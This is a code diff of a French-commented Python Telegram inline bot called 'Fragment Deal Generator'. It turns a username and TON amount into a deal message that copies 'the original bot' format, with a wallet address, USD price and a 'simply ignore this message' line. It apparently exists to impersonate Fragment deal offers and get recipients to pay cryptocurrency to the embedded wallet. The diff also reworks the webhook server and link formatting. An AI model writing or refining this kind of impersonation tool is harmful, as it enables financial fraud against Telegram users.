@@ -25,30 +25,76 @@ print(f"📱 Web App: {WEBAPP_URL}")
 app = None
 event_loop = None
 
-def get_ton_price():
-    """Récupère le prix du TON en temps réel"""
+async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Gestionnaire des requêtes inline"""
     try:
-        # API CoinGecko plus fiable
-        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
-        with urllib.request.urlopen(url, timeout=10) as response:
-            data = json.loads(response.read().decode())
-            price = float(data['the-open-network']['usd'])
-            print(f"💰 Prix TON récupéré: ${price:.4f}")
-            return price
-    except Exception as e:
-        print(f"❌ Erreur API CoinGecko: {e}")
-        # Fallback vers DIA API
+        from telegram import InlineQueryResultArticle, InputTextMessageContent
+        
+        query = update.inline_query.query.strip() if update.inline_query.query else ""
+        
+        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
+        if not query:
+            await update.inline_query.answer([], cache_time=0, is_personal=True)
+            return
+        
+        # Parsing de la requête (username montant)
+        parts = query.split()
+        
+        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
+        if len(parts) < 2:
+            await update.inline_query.answer([], cache_time=0, is_personal=True)
+            return
+        
+        username = parts[0].replace('@', '')  # Supprime @ si présent
+        
         try:
-            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
-            with urllib.request.urlopen(url, timeout=5) as response:
-                data = json.loads(response.read().decode())
-                price = float(data.get('Price', 5.50))
-                print(f"💰 Prix TON (fallback): ${price:.4f}")
-                return price
-        except Exception as e2:
-            print(f"❌ Erreur API DIA: {e2}")
-            # Prix par défaut si toutes les APIs échouent
-            return 5.50
+            ton_amount = float(parts[1])
+            if ton_amount <= 0:
+                raise ValueError("Montant doit être positif")
+        except ValueError:
+            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
+            await update.inline_query.answer([], cache_time=0, is_personal=True)
+            return
+        
+        # Génération du message avec le format exact du bot original
+        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
+        
+        # Prix actuel pour l'affichage
+        current_ton_price = get_ton_price()
+        current_usd_value = ton_amount * current_ton_price
+        
+        # Résultat inline - SEULEMENT si format correct
+        results = [
+            InlineQueryResultArticle(
+                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
+                title=f"Fragment Deal: @{username}",
+                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                input_message_content=InputTextMessageContent(
+                    fragment_message,
+                    entities=entities,
+                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
+                ),
+                reply_markup=keyboard
+            )
+        ]
+        
+        await update.inline_query.answer(results, cache_time=0, is_personal=True)
+        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON")
+        
+    except Exception as e:
+        print(f"❌ Erreur dans inline_query_handler: {e}")
+        await update.inline_query.answer([], cache_time=0, is_personal=True)
+
+def get_ton_price():
+    """Récupère le prix actuel du TON depuis Coingecko"""
+    try:
+        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
+        with urllib.request.urlopen(url, timeout=5) as response:
+            data = json.loads(response.read())
+            return float(data['the-open-network']['usd'])
+    except Exception as e:
+        print(f"⚠️ Erreur récupération prix TON: {e}")
+        return 5.5  # Prix de fallback si API indisponible
 
 def generate_fragment_message(username, ton_amount):
     """Génère le message Fragment avec formatage identique au bot original"""
@@ -115,7 +161,7 @@ Important:
             length=len(important_text1)
         ))
     
-    # 4. Deuxième point Important en gras
+    # 4. Deuxième point Important en gras  
     important_text2 = "• If you choose not to proceed, simply ignore this message."
     important_start2 = fragment_message.find(important_text2)
     if important_start2 != -1:
@@ -125,14 +171,13 @@ Important:
             length=len(important_text2)
         ))
     
-    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
+    # 5. Adresse wallet en monospace (code)
     wallet_start = fragment_message.find(wallet_address)
     if wallet_start != -1:
         entities.append(MessageEntity(
-            type=MessageEntity.TEXT_LINK,
+            type=MessageEntity.CODE,
             offset=wallet_start,
-            length=48,  # Longueur exacte de UQ...PR (48 caractères)
-            url=f"https://tonviewer.com/{wallet_address}"
+            length=len(wallet_address)
         ))
         print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
     
@@ -149,186 +194,150 @@ Important:
     
     return fragment_message, entities, keyboard
 
-async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gestionnaire des requêtes inline"""
-    try:
-        query = update.inline_query.query.strip() if update.inline_query.query else ""
-        
-        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
-        if not query:
-            await update.inline_query.answer([], cache_time=0)
-            return
-        
-        # Parsing de la requête (username montant)
-        parts = query.split()
-        
-        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
-        if len(parts) < 2:
-            await update.inline_query.answer([], cache_time=0)
-            return
-        
-        username = parts[0].replace('@', '')  # Supprime @ si présent
-        
-        try:
-            ton_amount = float(parts[1])
-            if ton_amount <= 0:
-                raise ValueError("Montant doit être positif")
-        except ValueError:
-            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
-            await update.inline_query.answer([], cache_time=0)
-            return
-        
-        # Génération du message avec le format exact du bot original
-        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
-        
-        # Prix actuel pour l'affichage
-        current_ton_price = get_ton_price()
-        current_usd_value = ton_amount * current_ton_price
-        
-        # Création du contenu du message inline
-        input_message_content = InputTextMessageContent(
-            fragment_message,
-            entities=entities,
-            disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
-        )
-        
-        # Résultat inline - SEULEMENT si format correct
-        results = [
-            InlineQueryResultArticle(
-                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
-                title=f"Fragment Deal: @{username}",
-                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
-                input_message_content=input_message_content,
-                reply_markup=keyboard
-            )
-        ]
-        
-        await update.inline_query.answer(results, cache_time=0)
-        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON")
-
-    except Exception as e:
-        print(f"❌ Erreur lors du traitement de la requête inline: {e}")
-
 class WebhookHandler(BaseHTTPRequestHandler):
-    """Gestionnaire webhook HTTP simple"""
+    """Gestionnaire des requêtes webhook de Telegram"""
     
     def do_POST(self):
-        """Gestion des requêtes POST"""
-        global app, event_loop
-        
-        try:
-            if self.path != f'/{BOT_TOKEN}':
-                self.send_response(404)
-                self.end_headers()
-                return
-            
-            # Lecture des données
-            content_length = int(self.headers.get('content-length', 0))
-            post_data = self.rfile.read(content_length)
-            
-            # Parse JSON
-            update_data = json.loads(post_data.decode('utf-8'))
-            
-            # Traitement asynchrone
-            if app and event_loop:
+        """Traite les webhooks POST de Telegram"""
+        if self.path == f'/{BOT_TOKEN}':
+            try:
+                # Lecture des données POST
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length)
+                
+                # Parse et traitement
+                update_data = json.loads(post_data.decode('utf-8'))
+                update = Update.de_json(update_data, app.bot)
+                
+                # Traitement asynchrone
                 asyncio.run_coroutine_threadsafe(
-                    process_update(update_data),
+                    app.process_update(update),
                     event_loop
                 )
-            
-            # Réponse OK
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
+                
+                # Réponse HTTP
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'OK')
+                
+                print(f"📨 Webhook traité: {update.update_id}")
+                
+            except Exception as e:
+                print(f"❌ Erreur webhook: {e}")
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(f"Error: {e}".encode())
+        else:
+            self.send_response(404)
             self.end_headers()
-            self.wfile.write(b'{"ok":true}')
-            
-        except Exception as e:
-            print(f"❌ Erreur webhook: {e}")
-            self.send_response(500)
-            self.end_headers()
+            self.wfile.write(b'Not Found')
     
     def do_GET(self):
-        """Page de status simple"""
-        self.send_response(200)
-        self.send_header('Content-Type', 'text/plain')
-        self.end_headers()
-        
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
-        self.wfile.write(status.encode('utf-8'))
+        """Endpoint de vérification de santé"""
+        if self.path == '/health':
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            
+            status = {
+                "status": "healthy",
+                "bot": "Fragment Deal Generator v4.7",
+                "timestamp": int(time.time())
+            }
+            self.wfile.write(json.dumps(status).encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b'404 Not Found')
     
     def log_message(self, format, *args):
-        """Désactiver les logs HTTP"""
+        """Log personnalisé (désactivé pour réduire le bruit)"""
         pass
 
-async def process_update(update_data):
-    """Traitement des updates Telegram"""
-    global app
-    
-    try:
-        if app:
-            update = Update.de_json(update_data, app.bot)
-            if update:
-                await app.process_update(update)
-    except Exception as e:
-        print(f"❌ Erreur traitement update: {e}")
-
-def run_webhook_server():
-    """Démarre le serveur webhook"""
-    try:
-        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
-        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
-        server.serve_forever()
-    except Exception as e:
-        print(f"❌ Erreur serveur webhook: {e}")
-
-async def setup_bot():
-    """Configuration du bot"""
+async def setup_webhook():
+    """Configuration du webhook Telegram"""
     global app, event_loop
     
     try:
-        # Création de l'application
+        # Création de l'application Telegram
         app = Application.builder().token(BOT_TOKEN).build()
         
-        # Ajout du gestionnaire inline
+        # 🎯 AJOUT DU GESTIONNAIRE INLINE
         app.add_handler(InlineQueryHandler(inline_query_handler))
-        
-        # Initialisation
-        await app.initialize()
-        await app.start()
+        print("✅ Handler inline query ajouté")
         
         # Configuration du webhook
         webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
-        await app.bot.set_webhook(url=webhook_url)
         
-        print(f"✅ Bot initialisé avec webhook: {webhook_url}")
+        await app.bot.set_webhook(
+            url=webhook_url,
+            allowed_updates=["inline_query"]  # Seulement les requêtes inline
+        )
         
-        # Garde l'event loop actif
-        event_loop = asyncio.get_event_loop()
+        print(f"✅ Webhook Telegram configuré: {webhook_url}")
         
-        # Démarrage du serveur webhook dans un thread séparé
-        webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
-        webhook_thread.start()
+        # Informations du bot
+        me = await app.bot.get_me()
+        print(f"🤖 Bot connecté: @{me.username} ({me.first_name})")
         
-        # Attente infinie
-        while True:
-            await asyncio.sleep(1)
-            
+        return True
+        
     except Exception as e:
-        print(f"❌ Erreur setup bot: {e}")
-        raise
+        print(f"❌ Erreur setup webhook: {e}")
+        return False
+
+async def start_bot():
+    """Démarrage principal du bot"""
+    global event_loop
+    
+    print("🚀 Démarrage du bot Fragment Deal Generator...")
+    
+    # Configuration du webhook
+    webhook_ready = await setup_webhook()
+    if not webhook_ready:
+        print("❌ Impossible de configurer le webhook")
+        return
+    
+    # Serveur HTTP pour les webhooks
+    event_loop = asyncio.get_event_loop()
+    
+    def run_http_server():
+        """Lance le serveur HTTP dans un thread séparé"""
+        try:
+            server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
+            print(f"🌐 Serveur HTTP démarré sur 0.0.0.0:{PORT}")
+            server.serve_forever()
+        except Exception as e:
+            print(f"❌ Erreur serveur HTTP: {e}")
+    
+    # Démarrage du serveur dans un thread
+    server_thread = threading.Thread(target=run_http_server, daemon=True)
+    server_thread.start()
+    
+    print("✅ Bot inline Fragment Deal Generator opérationnel !")
+    print(f"📝 Usage: @{(await app.bot.get_me()).username} <username> <montant_TON>")
+    
+    # Maintien du bot en vie
+    try:
+        while True:
+            await asyncio.sleep(60)
+            print(f"💓 Bot actif - {time.strftime('%Y-%m-%d %H:%M:%S')}")
+    except KeyboardInterrupt:
+        print("🛑 Arrêt demandé...")
+    except Exception as e:
+        print(f"❌ Erreur inattendue: {e}")
 
 def main():
-    """Fonction principale"""
+    """Point d'entrée principal"""
     try:
-        print("🚀 Démarrage du bot inline...")
-        
         # Démarrage asynchrone
-        asyncio.run(setup_bot())
-        
+        asyncio.run(start_bot())
     except KeyboardInterrupt:
-        print("🛑 Arrêt du bot...")
+        print("\n🛑 Bot arrêté par l'utilisateur")
     except Exception as e:
         print(f"❌ Erreur critique: {e}")
+    finally:
+        print("👋 Arrêt du Fragment Deal Generator")
 
 if __name__ == '__main__':
     main()
